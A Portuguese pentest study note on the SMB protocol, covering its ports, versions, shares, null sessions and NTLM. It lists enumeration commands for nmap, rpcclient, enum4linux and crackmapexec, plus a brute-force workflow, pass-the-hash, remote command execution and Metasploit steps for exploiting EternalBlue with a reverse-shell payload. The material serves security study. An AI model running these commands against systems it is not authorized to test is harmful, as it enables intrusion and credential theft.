# 🪟 SMB — Server Message Block

> Protocolo de compartilhamento de arquivos, impressoras e comunicação entre processos em redes Windows.
> Uma das superfícies de ataque mais ricas em ambientes corporativos.

---

## 🧠 O Que é SMB

SMB (Server Message Block) é um protocolo de rede da camada de aplicação que permite:
- Compartilhamento de arquivos e diretórios
- Compartilhamento de impressoras
- Comunicação entre processos (IPC)
- Autenticação e controle de acesso em rede

**Samba** é a implementação open-source do SMB para sistemas Linux/Unix. Permite que máquinas Linux participem de redes Windows.

---

## 🔢 Portas e Protocolos

| Porta | Protocolo | Daemon | Função |
|-------|-----------|--------|--------|
| **445/TCP** | SMB direto | `smbd` | SMB moderno — sem depender de NetBIOS |
| **139/TCP** | SMB sobre NetBIOS | `smbd` | Legado — compatibilidade com sistemas antigos |
| **137/UDP** | NetBIOS Name Service | `nmbd` | Registro e resolução de nomes na LAN |
| **138/UDP** | NetBIOS Datagram | `nmbd` | Broadcasts e comunicação sem conexão |

> 💡 Em ambientes modernos, porta **445** é a principal. Porta 139 existe por compatibilidade. As portas UDP são do `nmbd` — o daemon responsável pelos nomes NetBIOS.

---

## 📚 Versões do SMB

| Versão | Lançamento | Sistema | Status |
|--------|-----------|---------|--------|
| **SMBv1** | 1984 | Windows NT | ⛔ Obsoleto — vulnerável ao EternalBlue |
| **SMBv2** | 2006 | Windows Vista | ✅ Ainda usado |
| **SMBv2.1** | 2007 | Windows 7 | ✅ Ainda usado |
| **SMBv3** | 2012 | Windows 8/2012 | ✅ Atual — suporta criptografia |
| **SMBv3.1.1** | 2015 | Windows 10/2016 | ✅ Mais recente |

> ⚠️ **SMBv1 ativo = risco crítico.** É o protocolo explorado pelo EternalBlue (MS17-010) que causou o WannaCry. Se aparecer em scan, é finding imediato.

---

## 🗂️ Tipos de Shares

| Share | Tipo | Descrição |
|-------|------|-----------|
| `C$` | DISK | Share administrativo — acesso ao disco C inteiro |
| `ADMIN$` | DISK | Share administrativo — acesso ao `C:\Windows` |
| `IPC$` | IPC | Inter-Process Communication — canal RPC |
| `PRINT$` | DISK | Drivers de impressora |
| Shares customizados | DISK | Criados pelo administrador |

**Shares administrativos** (`C$`, `ADMIN$`) terminam com `$` — ficam ocultos na listagem padrão, mas existem em **todo** sistema Windows. Acesso requer privilégio de administrador local.

**`IPC$`** é especial — não é um diretório, é um canal de comunicação. Acesso ao IPC$ via null session permite enumeração de usuários, grupos e políticas **sem credencial**.

---

## 🔓 Null Session (Sessão Nula)

Conexão ao SMB sem fornecer usuário ou senha. Em configurações antigas ou mal configuradas, o servidor aceita.

```bash
# Via smbclient
smbclient -L //IP -N

# Via rpcclient
rpcclient -U "" -N IP
```

**Com null session habilitada você consegue:**
- Listar shares disponíveis
- Enumerar usuários e grupos (via IPC$)
- Ler políticas de senha
- Mapear a estrutura do domínio

---

## 🔑 Autenticação SMB

| Tipo | Descrição |
|------|-----------|
| **NTLM** | Hash da senha — legado mas ainda muito presente |
| **NTLMv2** | Versão mais segura do NTLM |
| **Kerberos** | Padrão em domínios Active Directory |

**Por que NTLM importa em pentest:**
- Hash NTLM pode ser capturado via **Responder** (LLMNR/NBT-NS poisoning)
- Hash pode ser usado diretamente sem quebrar — **Pass-the-Hash**
- Hash pode ser quebrado offline com **hashcat** ou **john**

---

## 🛠️ Ferramentas de Enumeração

### Nmap (NSE)
```bash
# Versão e OS
nmap --script smb-os-discovery -p445 IP

# Enumeração de shares
nmap --script smb-enum-shares -p445 IP

# Enumeração de usuários
nmap --script smb-enum-users -p445 IP

# Políticas de segurança
nmap --script smb-security-mode -p445 IP

# Verificar EternalBlue
nmap --script smb-vuln-ms17-010 -p445 IP

# Tudo de uma vez
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-security-mode -p445 IP
```

---

### Metasploit
```bash
# Versão
use auxiliary/scanner/smb/smb_version

# Usuários
use auxiliary/scanner/smb/smb_enumusers

# Shares
use auxiliary/scanner/smb/smb_enumshares

# Brute force
use auxiliary/scanner/smb/smb_login

# Verificar MS17-010
use auxiliary/scanner/smb/smb_ms17_010
```

---

### smbclient (cliente interativo)
```bash
# Listar shares (sem credencial)
smbclient -L //IP -N

# Listar shares (com credencial)
smbclient -L \\\\IP\\ -U usuario

# Conectar em share
smbclient \\\\IP\\share -U usuario

# Comandos dentro do smbclient
ls              # listar
cd pasta        # navegar
get arquivo     # baixar
put arquivo     # enviar
pwd             # diretório atual
exit            # sair
```

---

### rpcclient (enumeração via RPC)
```bash
# Conectar (null session)
rpcclient -U "" -N IP

# Comandos dentro do rpcclient
srvinfo              # info do servidor
enumdomusers         # listar usuários
enumdomgroups        # listar grupos
querydominfo         # política de senha e info do domínio
netshareenumall      # listar todos os shares
getdompwinfo         # complexidade de senha
lookupnames admin    # RID de um usuário específico
```

---

### enum4linux (tudo automatizado)
```bash
# Enumeração completa
enum4linux -a IP

# Com credencial
enum4linux -a -u usuario -p senha IP

# Só usuários
enum4linux -U IP

# Só shares
enum4linux -S IP
```

---

### crackmapexec (automação avançada)
```bash
# Validar credencial
crackmapexec smb IP -u usuario -p senha

# Listar shares
crackmapexec smb IP -u usuario -p senha --shares

# Listar usuários
crackmapexec smb IP -u usuario -p senha --users

# Executar comando remoto
crackmapexec smb IP -u usuario -p senha -x "whoami"

# Pass-the-Hash
crackmapexec smb IP -u usuario -H HASH_NTLM
```

---

## 🔁 Workflow de Enumeração SMB

```bash
# 1. Verificar portas
nmap -p139,445 IP

# 2. Versão e dialetos
use auxiliary/scanner/smb/smb_version

# 3. Verificar SMBv1 (EternalBlue)
nmap --script smb-vuln-ms17-010 -p445 IP

# 4. Null session
smbclient -L //IP -N
rpcclient -U "" -N IP

# 5. Enumeração com null session
rpcclient → enumdomusers
rpcclient → getdompwinfo  ← LockoutTries!

# 6. Se LockoutTries=0 → brute force seguro
use auxiliary/scanner/smb/smb_login
set USER_FILE usuarios.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# 7. Com credencial → acesso completo
smbclient \\\\IP\\share -U usuario
crackmapexec smb IP -u usuario -p senha --shares
```

---

## ⚔️ Vulnerabilidades Importantes

| CVE | Nome | Impacto | Afeta |
|-----|------|---------|-------|
| **MS17-010** | EternalBlue | RCE sem auth via SMBv1 | Windows 7 / 2008 sem patch |
| **CVE-2017-7494** | SambaCry | RCE via pipe writeable | Samba < 4.6.4 |
| **CVE-2020-0796** | SMBGhost | RCE via SMBv3 compressão | Windows 10 v1903/1909 |
| **MS08-067** | Conficker | RCE | Windows XP / 2003 |

```bash
# Verificar EternalBlue
nmap --script smb-vuln-ms17-010 -p445 IP
use auxiliary/scanner/smb/smb_ms17_010

# Explorar EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

---

## 🚩 Red Flags em Enumeração SMB

| Achado | Risco | Por Quê |
|--------|-------|---------|
| SMBv1 ativo | 🔴 Crítico | Vulnerável ao EternalBlue |
| Null session permitida | 🔴 Alto | Enumeração sem credencial |
| LockoutTries=0 | 🔴 Alto | Brute force irrestrito |
| PasswordMin < 8 | 🟡 Médio | Senhas fracas prováveis |
| ADMIN$ com WRITE | 🔴 Crítico | Execução remota viável |
| Senha padrão (admin:password) | 🔴 Crítico | Acesso imediato |

---

## 🧠 Modelo Mental

```
SMB exposto
    ↓
Null session?  →  SIM → enumerar usuários, grupos, políticas
    ↓                    (sem nenhuma credencial)
LockoutTries?  →  0   → brute force irrestrito
    ↓
Credencial obtida
    ↓
ADMIN$ WRITE?  →  SIM → execução remota como SYSTEM (PsExec, Impacket)
C$ READ?       →  SIM → leitura completa do disco
```

---

## 📌 Relacionados

- [[FTP — File Transfer Protocol]]
- [[Samba Recon Completo]]
- [[SMB Brute Force e Acesso a Shares]]
- [[SMB — Enumeração e Comprometimento]]
- [[Nmap — NSE]]
- [[Metasploit — Fundamentos e Arquitetura]]
- [[Cheatsheet — Portas Importantes]]

#protocolo/smb #windows #recon/ativo #exploração
